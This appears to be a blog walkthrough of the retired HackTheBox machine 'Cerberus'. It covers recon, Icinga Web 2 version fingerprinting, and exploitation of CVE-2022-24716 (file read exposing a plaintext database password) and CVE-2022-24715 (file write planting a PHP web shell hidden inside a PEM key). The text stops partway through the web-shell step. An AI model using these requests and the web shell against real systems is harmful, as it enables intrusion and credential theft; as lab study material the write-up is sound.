---
title: HTB: Cerberus
url: https://0xdf.gitlab.io/2023/07/29/htb-cerberus.html
date: 2023-07-29T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: ctf, htb-cerberus, hackthebox, nmap, ttl, wireshark, dig, ffuf, icinga, github, cve-2022-24716, cve-2022-24715, file-read, arbitrary-write, icinga-module, firejail, cve-2022-31214, sssd, hashcat, chisel, evil-winrm, manageengine, adselfservice, cve-2022-47966, metasploit, saml, saml-decoder, oscp-plus-v3
---

![Cerberus](/img/cerberus-cover.png)

Cerberus is unique in that it’s one of the few boxes on HTB (or any CTF) that has Windows hosting a Linux VM. To start, I can only access an IcingaWeb2 instance running in the VM. I’ll exploit two CVEs in Icinga, first with file read to get credentials, and then a file write to write a fake module and get execution. Inside the VM, I’ll exploit Firejail to get root. I’ll also get creds for a user on the host from SSSD, and then tunnel through the VM to get WinRM access to the host. To get SYSTEM on the host, I’ll exploit a SAML vulnerability in ManageEngine’s ADSelfService Plus.

## Box Info

| Name | [Cerberus](https://hackthebox.com/machines/cerberus)  [Cerberus](https://hackthebox.com/machines/cerberus) [Play on HackTheBox](https://hackthebox.com/machines/cerberus) |
| --- | --- |
| Release Date | [18 Mar 2023](https://twitter.com/hackthebox_eu/status/1636396939892883457) |
| Retire Date | 29 Jul 2023 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Cerberus |
| Radar Graph | Radar chart for Cerberus |
| First Blood User | 02:31:41[Sm1l3z Sm1l3z](https://app.hackthebox.com/users/357237) |
| First Blood Root | 03:37:04[Geiseric Geiseric](https://app.hackthebox.com/users/184611) |
| Creators | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053)  [TRX TRX](https://app.hackthebox.com/users/31190) |

## Recon

### nmap

`nmap` finds a single open TCP port, HTTP on (8080):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.205
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-21 19:54 EDT
Nmap scan report for 10.10.11.205
Host is up (0.088s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
oxdf@hacky$ nmap -p 8080 -sCV 10.10.11.205
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-21 19:58 EDT
Nmap scan report for 10.10.11.205
Host is up (0.088s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds

```

The webserver is returning a redirect to `http://icinga.cerberus.local:8080/icingaweb2`. I’ll note the domain, and get more into the Icingaweb software when I enumerate the webserver.

There are three UDP ports in the top 1000 that look open to `nmap`:

```

oxdf@hacky$ nmap -sU 10.10.11.205
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-28 09:56 EDT
Nmap scan report for icinga.cerberus.local (10.10.11.205)
Host is up (0.096s latency).
Not shown: 997 open|filtered ports
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 20.99 seconds

```

Having NTP available is good to know if I need to do anything with Kerberos.

### OS Identifitcation

Based on the [Apache](https://packages.ubuntu.com/search?keywords=apache2) version, the host is likely running Ubuntu 22.04 jammy. This is interesting, as HackTheBox advertises this as a Windows machine.

![image-20230322060753076](/img/image-20230322060753076.png)

I can test this by looking at the time to live (TTL) on the ICMP packets that come back when I ping the host:

```

oxdf@hacky$ ping -c 3 10.10.11.205
PING 10.10.11.205 (10.10.11.205) 56(84) bytes of data.
64 bytes from 10.10.11.205: icmp_seq=1 ttl=127 time=94.4 ms
64 bytes from 10.10.11.205: icmp_seq=2 ttl=127 time=94.6 ms
64 bytes from 10.10.11.205: icmp_seq=3 ttl=127 time=94.5 ms
--- 10.10.11.205 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2007ms
rtt min/avg/max/mdev = 94.392/94.491/94.585/0.078 ms

```

The default TTL on windows is 128, which gets decremented by one at the router between my host and the box to 127. On the other hand the default for Linux is typically 64, so I would expect to see 63 for a Linux host. This implies the webserver is in some kind of Ubuntu VM or container running on a Windows host.

I can also look at the TTL in the TCP packets when I request the page on 8080 in Wireshark. Here is a 200 OK response for the webserver:

![image-20230728115147584](/img/image-20230728115147584.png)

The TTL of 62 suggests it started as 64 (Linux), was decremented at the host, and then again at the router between my VM and the host.

### DNS - UDP 53

I’ll use `dig` to try to query Cerberus for some DNS mappings. Trying to get `cerberus.htb` times out:

```

oxdf@hacky$ dig +short @10.10.11.205 cerberus.htb
;; communications error to 10.10.11.205#53: timed out
;; communications error to 10.10.11.205#53: timed out
;; communications error to 10.10.11.205#53: timed out
;; no servers could be reached

```

However, trying to get `cerberus.local` (from the redirect on TCP 8080) works immediately:

```

oxdf@hacky$ dig +short @10.10.11.205 cerberus.local
172.16.22.1
10.10.11.205

```

I suspect the DNS server doesn’t know `cerberus.htb`, so it is trying to query an upstream server, and likely failing to get out to the internet.

The fact that `cerberus.local` points to both the expected IP *and* 172.16.22.1 is interesting. The .1 is likely still the host machine, but it makes sense that the VM or container would be able to get access to the machine by hostname from within the 172.16 network.

Reverse lookups must be disabled, as giving IPs in 172.16.22.0/24 with the `-x` flag timeout as well.

The `icinga` domain returns a couple other hostnames:

```

oxdf@hacky$ dig @10.10.11.205 icinga.cerberus.local

; <<>> DiG 9.18.12-0ubuntu0.22.04.1-Ubuntu <<>> @10.10.11.205 icinga.cerberus.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 49511
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;icinga.cerberus.local.         IN      A

;; AUTHORITY SECTION:
cerberus.local.         3600    IN      SOA     dc.cerberus.local. hostmaster.cerberus.local. 601 900 600 86400 3600

;; Query time: 95 msec
;; SERVER: 10.10.11.205#53(10.10.11.205) (UDP)
;; WHEN: Fri Jul 28 10:36:19 EDT 2023
;; MSG SIZE  rcvd: 114

```

I’ll add all of these to my local `hosts` file.

### LDAP - UDP 389

I suspect that LDAP is active on the host on TCP as well, but I can’t access it because of a firewall. Unfortunately for me, LDAP over UDP is *very* [limited](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3fad0ec9-414c-432a-ba0b-837c74091dd6?redirectedfrom=MSDN):

> [Active Directory](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_e467d927-17bf-49c9-98d1-96ddf61ddd90) supports search over [UDP](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_a70f5e84-6960-42f0-a160-ba0281eb548d) only for searches against [rootDSE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_29942b69-e0ed-4fe7-bbbf-1a6a3f9eeeb6).

The Microsoft glossery defines the [rootDSE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_29942b69-e0ed-4fe7-bbbf-1a6a3f9eeeb6) as:

> **root directory system agent-specific entry (rootDSE)**: The logical root of a [directory](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_49ce3946-04d2-4cc9-9350-ebcd952b9ab9) server, whose [distinguished name (DN)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_1175dd11-9368-41d5-98ed-d585f268ad4b) is the empty string. In the [Lightweight Directory Access Protocol (LDAP)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_45643bfb-b4c4-432c-a10f-b98790063f8d), the [rootDSE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_29942b69-e0ed-4fe7-bbbf-1a6a3f9eeeb6) is a nameless entry (a [DN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_1175dd11-9368-41d5-98ed-d585f268ad4b) with an empty string) containing the configuration status of the server. Access to this entry is typically available to unauthenticated clients. The [rootDSE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_29942b69-e0ed-4fe7-bbbf-1a6a3f9eeeb6) contains [attributes](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_108a1419-49a9-4d19-b6ca-7206aa726b3f) that represent the features, capabilities, and extensions provided by the particular server.

Basically I could only get information about available auth methods.

### Subdomain Fuzz

Given the use of domains, I’ll check to see if there are any other subdomains that return anything over HTTP other than a redirect to `icinga.cerberus.local`. I’ll use the `-fr` flag to filter out anything with `icinga` in the response. It finds nothing else:

```

oxdf@hacky$ ffuf -u http://10.10.11.205:8080 -H "Host: FUZZ.cerberus.local" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fr icinga

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.205:8080
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cerberus.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Regexp: icinga
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 446 req/sec :: Duration: [0:04:16] :: Errors: 0 ::

```

I’ll add what I’ve got to my `/etc/hosts` file:

```
10.10.11.205 icinga.cerberus.local cerberus.local

```

### icinga.cerberus.local - TCP 8080

#### Site

The site is a Icinga login page:

![image-20230322061526163](/img/image-20230322061526163.png)

The social media logos got to the real company’s pages. [Icinga](https://icinga.com/) is a “resilient, open source monitoring and metric solution system.”

#### Tech Stack

The source for [IcingaWeb2](https://github.com/Icinga/icingaweb2) shows it’s a PHP based site:

![image-20230322062318808](/img/image-20230322062318808.png)

Visiting `/` enters a redirect chain of to `/icingaweb2` -> `/icingaweb2/` -> `/icingaweb2/authentication/login` -> `/icingaweb2/authentication/login?_checkCookie=1` -> `/icingaweb2/authentication/login`. The final response sets a cookie that looks like a standard PHP session cookie:

```

HTTP/1.1 200 OK
Date: Wed, 22 Mar 2023 10:15:00 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: Icingaweb2=5uv4jiuedarbhn8gbq9kv1umsv; path=/icingaweb2/; HttpOnly
Vary: Accept-Encoding
Content-Length: 6815
Connection: close
Content-Type: text/html; charset=UTF-8

```

The 404 page is a custom page by icinga:

![image-20230322062549882](/img/image-20230322062549882.png)

I can’t find anything easy information that leaks the version of icinga running here.

#### Incinga Web 2 Version

Poking at bit more at the version, I’ll clone the [repo](https://github.com/Icinga/icingaweb2) to my system. I want to look for files that I can directly access without change that are updated a lot. The `public` directory seems like a good place to start. I’ll make this `bash` onliner to get the number of commits for each file:

```

oxdf@hacky$ find public/ -type f | while read f; do echo -n "$f: "; git log --oneline "$f" | wc -l; done | sort -nrk 2
public/js/icinga/loader.js: 248
public/js/icinga/events.js: 210
public/css/icinga/forms.less: 196
public/css/icinga/main.less: 161
public/js/icinga/ui.js: 146
public/css/icinga/menu.less: 144
public/css/icinga/widgets.less: 110
public/css/icinga/base.less: 110
public/css/icinga/layout-structure.less: 106
public/css/icinga/setup.less: 83
public/css/icinga/login.less: 76
public/css/icinga/layout.less: 68
public/js/icinga/behavior/navigation.js: 60
public/css/icinga/tabs.less: 55
public/js/icinga/utils.js: 50
public/js/icinga/behavior/collapsible.js: 45
public/js/icinga/history.js: 40
public/css/icinga/mixins.less: 40
public/css/icinga/controls.less: 39
public/js/icinga/behavior/actiontable.js: 32
public/css/icinga/responsive.less: 28
public/js/icinga/storage.js: 24
public/css/themes/high-contrast.less: 22
public/js/helpers.js: 19
public/js/icinga.js: 18
public/index.php: 18
public/js/icinga/behavior/modal.js: 16
public/css/pdf/pdfprint.less: 15
public/js/icinga/behavior/form.js: 14
public/js/icinga/module.js: 13
public/js/icinga/logger.js: 13
public/font/ifont.woff: 13
public/font/ifont.ttf: 13
public/font/ifont.svg: 13
public/font/ifont.eot: 13
public/css/icinga/nav.less: 13
public/css/icinga/modal.less: 13
public/js/icinga/timezone.js: 12
public/js/icinga/behavior/input-enrichment.js: 12
public/css/icinga/about.less: 12
public/js/icinga/timer.js: 11
public/js/icinga/behavior/datetime-picker.js: 11
public/css/icinga/badges.less: 11
public/css/icinga/audit.less: 11
public/css/themes/Winter.less: 10
public/js/icinga/behavior/flyover.js: 9
public/js/icinga/behavior/application-state.js: 9
public/js/icinga/eventlistener.js: 8
public/css/themes/colorblind.less: 8
public/css/icinga/compat.less: 8
public/css/icinga/spinner.less: 6
public/css/icinga/health.less: 6
public/js/icinga/behavior/autofocus.js: 5
public/css/icinga/print.less: 5
public/css/icinga/grid.less: 5
public/css/icinga/animation.less: 5
public/font/ifont.woff2: 4
public/js/icinga/behavior/selectable.js: 3
public/js/icinga/behavior/filtereditor.js: 3
public/js/icinga/behavior/dropdown.js: 3
public/img/icons/uebersicht.png: 3
public/img/icons/search.png: 3
public/img/icons/flapping.png: 3
public/img/icons/error.png: 3
public/img/icons/acknowledgement.png: 3
public/img/icinga-logo.png: 3
public/img/favicon.png: 3
public/js/define.js: 2
public/img/select-icon.svg: 2
public/img/select-icon.png: 2
public/img/select-icon-2x.png: 2
public/img/icons/servicegroup.png: 2
public/img/icons/prev.png: 2
public/img/icons/notification_disabled.png: 2
public/img/icons/next.png: 2
public/img/icons/json.png: 2
public/img/icons/expand.png: 2
public/img/icons/expand_petrol.png: 2
public/img/icons/active_passive_checks_disabled.png: 2
public/img/icons/active_checks_disabled.png: 2
public/img/icingaweb2-background-orbs.jpg: 2
public/img/icinga-logo.svg: 2
public/img/icinga-logo-big-dark.png: 2
public/img/icinga-loader.gif: 2
public/error_unavailable.html: 2
public/css/modes/system.less: 2
public/css/modes/none.less: 2
public/css/modes/light.less: 2
public/css/icinga/dev.less: 2
public/js/icinga/behavior/detach.js: 1
public/js/icinga/behavior/copy-to-clipboard.js: 1
public/img/winter/snow3.png: 1
public/img/winter/snow2.png: 1
public/img/winter/snow1.png: 1
public/img/winter/logo_icinga_big_winter.png: 1
public/img/website-icon.svg: 1
public/img/tree/tree-plus.gif: 1
public/img/tree/tree-minus.gif: 1
public/img/touch-icon.png: 1
public/img/theme-mode-thumbnail-system.svg: 1
public/img/theme-mode-thumbnail-light.svg: 1
public/img/theme-mode-thumbnail-dark.svg: 1
public/img/textarea-corner.png: 1
public/img/textarea-corner-2x.png: 1
public/img/orb-notifications.png: 1
public/img/orb-metrics.png: 1
public/img/orb-infrastructure.png: 1
public/img/orb-icinga.png: 1
public/img/orb-cloud.png: 1
public/img/orb-automation.png: 1
public/img/orb-analytics.png: 1
public/img/icons/win.png: 1
public/img/icons/user.png: 1
public/img/icons/user_petrol.png: 1
public/img/icons/up.png: 1
public/img/icons/up_petrol.png: 1
public/img/icons/unhandled.png: 1
public/img/icons/unhandled_petrol.png: 1
public/img/icons/tux.png: 1
public/img/icons/success.png: 1
public/img/icons/success_petrol.png: 1
public/img/icons/submit.png: 1
public/img/icons/submit_petrol.png: 1
public/img/icons/softstate.png: 1
public/img/icons/service.png: 1
public/img/icons/service_petrol.png: 1
public/img/icons/servicegroup_petrol.png: 1
public/img/icons/search_white.png: 1
public/img/icons/search_petrol.png: 1
public/img/icons/search_icinga_blue.png: 1
public/img/icons/save.png: 1
public/img/icons/save_petrol.png: 1
public/img/icons/reschedule.png: 1
public/img/icons/reschedule_petrol.png: 1
public/img/icons/remove.png: 1
public/img/icons/remove_petrol.png: 1
public/img/icons/refresh.png: 1
public/img/icons/refresh_petrol.png: 1
public/img/icons/prev_petrol.png: 1
public/img/icons/pdf.png: 1
public/img/icons/pdf_petrol.png: 1
public/img/icons/notification.png: 1
public/img/icons/notification_petrol.png: 1
public/img/icons/notification_disabled_petrol.png: 1
public/img/icons/next_petrol.png: 1
public/img/icons/logout.png: 1
public/img/icons/logout_petrol.png: 1
public/img/icons/json_petrol.png: 1
public/img/icons/in_downtime.png: 1
public/img/icons/in_downtime_petrol.png: 1
public/img/icons/host.png: 1
public/img/icons/host_petrol.png: 1
public/img/icons/hostgroup.png: 1
public/img/icons/hostgroup_petrol.png: 1
public/img/icons/history.png: 1
public/img/icons/history_petrol.png: 1
public/img/icons/flapping_petrol.png: 1
public/img/icons/error_white.png: 1
public/img/icons/error_petrol.png: 1
public/img/icons/edit.png: 1
public/img/icons/edit_petrol.png: 1
public/img/icons/downtime_start.png: 1
public/img/icons/downtime_start__petrol.png: 1
public/img/icons/downtime_end.png: 1
public/img/icons/downtime_end_petrol.png: 1
public/img/icons/down.png: 1
public/img/icons/down_petrol.png: 1
public/img/icons/disabled.png: 1
public/img/icons/disabled_petrol.png: 1
public/img/icons/dashboard.png: 1
public/img/icons/dashboard_petrol.png: 1
public/img/icons/csv.png: 1
public/img/icons/csv_petrol.png: 1
public/img/icons/create.png: 1
public/img/icons/create_petrol.png: 1
public/img/icons/configuration.png: 1
public/img/icons/configuration_petrol.png: 1
public/img/icons/comment.png: 1
public/img/icons/comment_petrol.png: 1
public/img/icons/active_passive_checks_disabled_petrol.png: 1
public/img/icons/active_checks_disabled_petrol.png: 1
public/img/icons/acknowledgement_petrol.png: 1
public/img/icingaweb2-background.jpg: 1
public/img/icinga-logo-inverted.svg: 1
public/img/icinga-logo-dark.svg: 1
public/img/icinga-logo-compact.svg: 1
public/img/icinga-logo-compact-inverted.svg: 1
public/img/icinga-logo-big.svg: 1
public/img/icinga-logo-big.png: 1
public/img/icinga-logo-big-dark.svg: 1
public/img/icinga-loader-light.gif: 1
public/error_norewrite.html: 1
public/css/vendor/normalize.css: 1
public/css/icinga/php-diff.less: 1
public/css/icinga/login-orbs.less: 1
public/css/icinga/configmenu.less: 1

```

This command breaks down as:
- `find public/ -type f` - find all files in the `public` directory
- `| while read f; do [stuff] done` - read each line from the previous output, looping over it by storing it in the `$f` variable
- `echo -n "$f: "; git log --oneline "$f" | wc -l;` - print the filename and then the number of commits that `git log` shows for that file, by having each commit take one line (`--oneline`) and then using a line count
- `| sort -nrk 2` - sort the results numerically (`-n`) from highest to lowest (`-r`) based on column 2 (`-k 2`).

I’ll start with `loader.js`. I’ll create a file to map each commit to the MD5 of `loader.js` using another `bash` loop:

```

oxdf@hacky$ git log --oneline public/js/icinga/loader.js | cut -f1 -d' ' | while read commit; do git checkout "$commit"; echo -n "$commit "; md5sum public/js/icinga/loader.js; done 2>/dev/null > loader_md5s

```

This command breaks down as:
- `git log --oneline public/js/icinga/loader.js` - get the commit history for this file
- `| cut -f1 -d' '` - using space as a delimiter, get only the first column (the commit hash)
- `| while read commit; do [stuff]; done` - read each commit hash from the previous command, looping over them with the hash stored in the `$commit` variable
- `git checkout "$commit"; echo -n "$commit "; md5sum public/js/icinga/loader.js` - print the commit hash and then the `md5sum` of the file in that commit
- `2>/dev/null > loader_md5s` - get rid of STDERR output, and save STDOUT output to `loader_md5s`

This takes a minute to run, but once I’m done, I’ll get the MD5 of the file on Cerberus:

I’ll get the MD5 of the file on Cerberus:

```

oxdf@hacky$ curl -s http://icinga.cerberus.local:8080/icingaweb2/js/icinga/loader.js | md5sum
7a343667e4e58fae4a1935d7ac2747cb  -

```

And look for that in the hashes file I just created:

```

oxdf@hacky$ grep 7a343667e4e58fae4a1935d7ac2747cb loader_md5s 
228e50313 7a343667e4e58fae4a1935d7ac2747cb  public/js/icinga/loader.js

```

I’ll run `git log public/js/icinga/loader.js` and look for that hash:

```

commit 7ae8f26b92a81a8143dcce9aa5b0cbaaee13ee5e
Author: Johannes Meyer <johannes.meyer@icinga.com>
Date:   Thu Oct 7 13:38:12 2021 +0200

    js: Really maintain refresh interval over redirects
    
    fixes #4549

commit 228e5031310d13134fd7fa93281db55f9089f1d3
Author: Johannes Meyer <johannes.meyer@icinga.com>
Date:   Wed Jul 7 09:36:54 2021 +0200

    js: Allow to reload the window

```

This result tells me this version of IcingaWeb2 was released sometime between 7 July and 7 October 2021.

Looking at the releases page on the IcingaWEb2 GitHub, there’s the release of 2.9.0 on 12 July 2021:

![image-20230727163618577](/img/image-20230727163618577.png)

There’s also in 2021:
- 2.9.1 on 27 July
- 2.9.2 on 28 July
- 2.9.3 on 10 August
- 2.9.4 on 10 November

That means this must be somewhere between 2.9.1 and 2.9.3.

Looking through the other files on the list, the `widgets.less` file has commits on 6 July, 2 August, and 17 September, which makes it a great candidate to differentiate here. I’ll do the same thing. I’ll run `git checkout master` to get back to a clean state, and then run the loop again making a map of commits to hashes:

```

oxdf@hacky$ git log --oneline public/css/icinga/widgets.less | cut -f1 -d' ' | while read commit; do git checkout "$commit"; echo -n "$commit "; md5sum public/css/icinga/widgets.less; done 2>/dev/null > widgets_md5s

```

Now I find the hash on Cerberus and get the match:

```

oxdf@hacky$ curl -s http://icinga.cerberus.local:8080/icingaweb2/css/icinga/widgets.less | md5sum
1a758d39794c929869492dfceb56aa68  -
oxdf@hacky$ grep 1a758d39794c929869492dfceb56aa68 widgets_md5s 
5fae8fc2b 1a758d39794c929869492dfceb56aa68  public/css/icinga/widgets.less

```

That’s the 6 July commit:

```

commit 5fae8fc2b22361dd1a2c81e38c213972c1412609
Author: Florian Strohmaier <florian.strohmaier@icinga.com>
Date:   Tue Jul 6 14:05:51 2021 +0200

    CSS: Make labels wrap in Safari with `display: inline-block’
    
    refs #4421

```

So this has to be 2.9.0, 2.9.1, or 2.9.2. I could look for other files that might narrow it further, but this is good enough to start getting a feel for what to look for.

## Shell as www-data on icinga

### Access to Icinga

#### CVE-2022-24716

An internet search for “icinga exploit” finds articles talking about vulnerabilities from spring 2022:

![image-20230322063209712](/img/image-20230322063209712.png)

The [top link](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/) from SonarSource talks about two vulnerabilities. These vulnerabilities are visible as fixed in the [2.9.6 release](https://github.com/Icinga/icingaweb2/releases/tag/v2.9.6) in March 2022:

![image-20230727163921064](/img/image-20230727163921064.png)

I’ll come back to the second (CVE-2022-24715 which gives RCE but is also authenticated). The first is CVE-2022-24716, an arbitrary file disclosure vulnerability (not an LFI, as the file is not “included” or executed, just returned).

The details of CVE-2022-24716 are in the post. The short version is that the user can specify an empty “asset path” to `StaticController.php`, which allows for a path to be constructed using only user input. That means that `/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts` will return the contents of the `/etc/hosts` file:

```

oxdf@hacky$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts
127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

There is a matthew user in the `/etc/passwd` file, but I am not able to read anything out of `/home/matthew`.

#### Read Config Files

Searching for “icingaweb2 config files” finds [this page of the Icingaweb2 docs](https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/) on configuration. At the top, it summarizes the files stored in `/etc/icingaweb2`:

![image-20230322064943370](/img/image-20230322064943370.png)

`roles.ini` shows that the matthew user is an administrator, and `resources.ini` gives a password for connecting to a MySQL database as matthew:

```

oxdf@hacky$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/roles.ini
[Administrators]
users = "matthew"
permissions = "*"
groups = "Administrators"
unrestricted = "1"
oxdf@hacky$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0"

```

#### Login

The combination of the username matthew and the password “IcingaWebPassword2023” works to log into the site:

![image-20230322065217167](/img/image-20230322065217167.png)

### Arbitrary(ish) File Write

#### CVE-2022-24715

The other vulnerability in the [SonarSource post](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/) is CVE-2022-24715, which they label as RCE, but it’s really an arbitrary file write vulnerability that can be used to get RCE. The issues is in the `SshResourceForm.php` file:

```

public static function beforeAdd(ResourceConfigForm $form)
{
    $configDir = Icinga::app()->getConfigDir();
    $user = $form->getElement('user')->getValue();
    $filePath = $configDir . '/ssh/' . $user; // [1]
    if (! file_exists($filePath)) {
        $file = File::create($filePath, 0600);
    // [...]
    $file->fwrite($form->getElement('private_key')->getValue()); // [2]

```

The file path that’s written is assembled with `$user` as the end of it, and that value is just passed in from the form. There’s no sanitization, and it even allows for `../` in the username.

#### Trying to Upload [Fail]

To get to the vulnerable form, I’ll visit Configuration > Application > Resources, and click the “Create a New Resource” button:

![image-20230322164541841](/img/image-20230322164541841.png)

When the “New Resource” form pops up, I’ll change the resource type to “SSH Identity”:

![image-20230322164617938](/img/image-20230322164617938.png)

I’ll try to set the “User” to write to `/dev/shm/0xdf.txt`:

![image-20230322164808820](/img/image-20230322164808820.png)

It complains the the SSH key is invalid:

![image-20230322164827562](/img/image-20230322164827562.png)

#### Understanding SSH Key Format

If I generate an SSH key with `ssh-keygen` and try to upload it, the same message comes back. I’ll download a [vulnerable version](https://github.com/Icinga/icingaweb2/releases/tag/v2.8.6) of the source from GitHub, and take a look. The file they call out in the blog post, `SshResourceForm.php` also has the validation for the input:

```

        if ($this->getRequest()->getActionName() != 'editresource') {
            $callbackValidator = new Zend_Validate_Callback(function ($value) {
                if (
                    substr(ltrim($value), 0, 7) === 'file://'
                    || openssl_pkey_get_private($value) === false
                ) {
                    return false;
                }

                return true;
            });
            $callbackValidator->setMessage(
                $this->translate('The given SSH key is invalid'),
                Zend_Validate_Callback::INVALID_VALUE
            );

```

If the input starts with `file://` or doesn’t pass `openssl_pkey_get_private`, it fails validation. `openssl_pkey_get_private` is a [PHP function](https://www.php.net/manual/en/function.openssl-pkey-get-private.php), and the input, according to the docs, is:

> `private_key` can be one of the following:
>
> 1. a string having the format file://path/to/file.pem. The named file must contain a PEM encoded certificate/private key (it may contain both).
> 2. A PEM formatted private key.

So this check only wants to be successful if the second of the two options is true.

#### Successful Key Upload

I’ll use `ssh-keygen` to make a key, giving it `-t rsa` to get the RSA key type, `-f dummy_key` to name it that in the current directory, `-m pem` to make it the PEM format that PHP is looking for.

I’ll grab the resulting private key and put it into the form:

![image-20230322170828600](/img/image-20230322170828600.png)

When I “Save Changes”, it reports success. Even better, when I check with the file read, the file is there in `/dev/shm/0xdf.txt`:

```

oxdf@hacky$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/dev/shm/0xdf.txt
-----BEGIN RSA PRIVATE KEY-----
MIIG4gIBAAKCAYEArtexfMckHYPk6IjX0N5s/AKmtR//U5FWsxcbsBaNTnKfPJFp
eU0yezrbOPNZYC/41swJdcney0gVKouAGIX/zp6PlNDEB+mcjBtEOHGf/xvlKK4S
ogxWXw+3Ndy+FeUd/J8B0jTFdoBTrmW7iWJzhoz9AT6YdeQs4zKRoK1g4tnaxB3c
...[snip]...

```

#### Better File Write

At this point I can only write a PEM formatted key. However, as [this article](https://docs.progress.com/bundle/datadirect-hybrid-data-pipeline-installation-46/page/PEM-file-format.html) points out:

> A PEM encoded file includes Base64 data. The private key is prefixed with a “—–BEGIN PRIVATE KEY—–” line and postfixed with an “—–END PRIVATE KEY—–”. Certificates are prefixed with a “—–BEGIN CERTIFICATE—–” line and postfixed with an “—–END CERTIFICATE—–” line. Text outside the prefix and postfix lines is ignored and can be used for metadata.

That last line is awesome. I can put whatever I want before and after the begin / end lines. I’ll write a PHP webshell using multiline PHP comments to create this polyglot that is both a valid PEM key and a functional PHP file:

![image-20230322172204855](/img/image-20230322172204855.png)

It writes:

```

oxdf@hacky$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/dev/shm/0xdf.php
<?php system($_REQUEST['cmd']); ?>

/*
-----BEGIN RSA PRIVATE KEY-----
MIIG4gIBAAKCAYEArtexfMckHYPk6IjX0N5s/AKmtR//U5FWsxcbsBaNTnKfPJFp
eU0yezrbOPNZYC/41swJdcney0gVKouAGIX/zp6PlNDEB+mcjBtEOHGf/xvlKK4S
